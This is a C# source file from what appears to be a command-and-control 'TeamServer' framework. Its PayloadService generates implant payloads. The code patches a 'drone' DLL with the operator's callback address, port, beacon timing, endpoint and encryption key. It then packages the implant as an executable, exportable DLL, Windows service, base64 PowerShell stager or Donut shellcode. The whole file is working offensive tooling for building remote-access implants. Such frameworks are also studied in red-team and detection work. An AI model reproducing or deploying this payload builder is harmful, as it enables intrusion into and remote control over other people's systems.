using System.Reflection;
using System.Security.Cryptography;
using System.Text;

using dnlib.DotNet;
using dnlib.DotNet.Writer;
using dnlib.PE;

using Donut;
using Donut.Structs;

using TeamServer.Handlers;
using TeamServer.Interfaces;
using TeamServer.Storage;
using TeamServer.Utilities;

namespace TeamServer.Services;

public class PayloadService : IPayloadService
{
    private readonly ICryptoService _crypto;
    private readonly IDatabaseService _db;

    public PayloadService(ICryptoService crypto, IDatabaseService db)
    {
        _crypto = crypto;
        _db = db;
    }

    public async Task<byte[]> GeneratePayload(Handler handler, PayloadFormat format, string source)
    {
        var drone = handler.Type switch
        {
            Handler.HandlerType.Http => await GenerateHttpPayload((HttpHandler)handler),
            Handler.HandlerType.Dns => throw new NotImplementedException(),
            Handler.HandlerType.Tcp => throw new NotImplementedException(),
            Handler.HandlerType.Smb => throw new NotImplementedException(),
            
            _ => throw new ArgumentOutOfRangeException(nameof(handler), handler, null)
        };

        var stager = format switch
        {
            PayloadFormat.Exe => await BuildExe(drone),
            PayloadFormat.Dll => BuildDll(drone),
            PayloadFormat.ServiceExe => await BuildServiceExe(drone),
            PayloadFormat.PowerShell => await BuildPowerShellScript(drone),
            PayloadFormat.Shellcode => await BuildShellcode(drone),
            
            _ => throw new ArgumentOutOfRangeException(nameof(format), format, null)
        };

        // write data into table
        var dao = new PayloadDao
        {
            MdHash = CalculateMd5Hash(stager),
            ShaHash = CalculateSha256Hash(stager),
            Generated = DateTime.UtcNow,
            Format = format.ToString(),
            Source = source
        };

        var conn = _db.GetAsyncConnection();
        await conn.InsertAsync(dao);

        return stager;
    }

    private async Task<byte[]> GenerateHttpPayload(HttpHandler handler)
    {
        var drone = await GetDroneModule();
        var helpersClass = drone.GetTypeDef("Helpers");

        var connectAddress = helpersClass.GetMethodDef("get_ConnectAddress");
        connectAddress.Body.Instructions[0].Operand = handler.ConnectAddress;

        var connectPort = helpersClass.GetMethodDef("get_ConnectPort");
        connectPort.Body.Instructions[0].Operand = handler.ConnectPort.ToString();

        var sleepInterval = helpersClass.GetMethodDef("get_SleepInterval");
        sleepInterval.Body.Instructions[0].Operand = handler.Profile.Http.Sleep.ToString();

        var sleepJitter = helpersClass.GetMethodDef("get_SleepJitter");
        sleepJitter.Body.Instructions[0].Operand = handler.Profile.Http.Jitter.ToString();

        var httpHandlerClass = drone.GetTypeDef("HttpHandler");
        var endpoint = httpHandlerClass.GetMethodDef("get_Endpoint");
        endpoint.Body.Instructions[0].Operand = handler.Profile.Http.Endpoint;

        await using var ms = new MemoryStream();
        drone.Write(ms);

        return ms.ToArray();
    }

    private static async Task<byte[]> BuildExe(byte[] payload)
    {
        var stager = await GetEmbeddedResource("exe_stager.exe");
        var module = ModuleDefMD.Load(stager);
        module.Resources.Add(new EmbeddedResource("drone", payload));
        module.Name = "drone.exe";

        using var ms = new MemoryStream();
        module.Write(ms);

        return ms.ToArray();
    }

    private static byte[] BuildDll(byte[] payload)
    {
        var module = ModuleDefMD.Load(payload);
        module.Name = "drone.dll";
        
        var program = module.GetTypeDef("Program");
        var exec = program.GetMethodDef("Execute");

        exec.ExportInfo = new MethodExportInfo();
        exec.IsUnmanagedExport = true;

        var opts = new ModuleWriterOptions(module)
        {
            PEHeadersOptions =
            {
                Machine = Machine.AMD64
            },
            Cor20HeaderOptions =
            {
                Flags = 0
            }
        };

        using var ms = new MemoryStream();
        module.Write(ms, opts);

        return ms.ToArray();
    }

    private static async Task<byte[]> BuildServiceExe(byte[] payload)
    {
        var shellcode = await BuildShellcode(payload);
        var stager = await GetEmbeddedResource("svc_stager.exe");
        var module = ModuleDefMD.Load(stager);
        module.Resources.Add(new EmbeddedResource("drone", shellcode));
        module.Name = "drone_svc.exe";

        using var ms = new MemoryStream();
        module.Write(ms);

        return ms.ToArray();
    }

    private static async Task<byte[]> BuildPowerShellScript(byte[] payload)
    {
        // build exe
        var exe = await BuildExe(payload);
        
        // get stager ps1
        var stager = await GetEmbeddedResource("stager.ps1");
        var stagerText = Encoding.ASCII.GetString(stager);

        // insert exe
        stagerText = stagerText.Replace("{{DATA}}", Convert.ToBase64String(exe));
        
        // remove ZWNBSP
        stagerText = stagerText.Remove(0, 3);

        return Encoding.ASCII.GetBytes(stagerText);
    }

    private static async Task<byte[]> BuildShellcode(byte[] payload)
    {
        var tmpShellcodePath = Path.GetTempFileName().Replace(".tmp", ".bin");
        var tmpPayloadPath = Path.GetTempFileName().Replace(".tmp", ".exe");
        
        // write drone to disk
        await File.WriteAllBytesAsync(tmpPayloadPath, payload);
        
        // donut config
        var config = new DonutConfig
        {
            Arch = 3, // x86+amd64
            Bypass = 1, // none
            Domain = "Drone",
            Class = "Drone.Program",
            Method = "Execute",
            InputFile = tmpPayloadPath,
            Payload = tmpShellcodePath
        };
        
        // generate shellcode
        Generator.Donut_Create(ref config);
        var shellcode = await File.ReadAllBytesAsync(tmpShellcodePath);
        
        // delete temp files
        File.Delete(tmpShellcodePath);
        File.Delete(tmpPayloadPath);
        File.Delete($"{tmpShellcodePath}.b64");

        return shellcode;
    }

    private async Task<ModuleDef> GetDroneModule()
    {
        var bytes = await GetEmbeddedResource("drone.dll");
        var module = ModuleDefMD.Load(bytes);

        // write in crypto key
        var key = await _crypto.GetKey();

        var cryptoClass = module.GetTypeDef("Crypto");
        var keyMethod = cryptoClass.GetMethodDef("get_Key");
        keyMethod.Body.Instructions[0].Operand = Convert.ToBase64String(key);

        return module;
    }

    private static async Task<byte[]> GetEmbeddedResource(string name)
    {
        var self = Assembly.GetExecutingAssembly();
        await using var rs = self.GetManifestResourceStream($"TeamServer.Resources.{name}");

        if (rs is null)
            return Array.Empty<byte>();

        await using var ms = new MemoryStream();
        await rs.CopyToAsync(ms);

        return ms.ToArray();
    }

    private static string CalculateMd5Hash(byte[] data)
    {
        using var md5 = MD5.Create();
        var hash = md5.ComputeHash(data);

        var sb = new StringBuilder();
        
        foreach (var b in hash)
            sb.Append(b.ToString("x2"));

        return sb.ToString();
    }

    private static string CalculateSha256Hash(byte[] data)
    {
        using var sha = SHA256.Create();
        var hash = sha.ComputeHash(data);

        var sb = new StringBuilder();
        
        foreach (var b in hash)
            sb.Append(b.ToString("x2"));

        return sb.ToString();
    }
}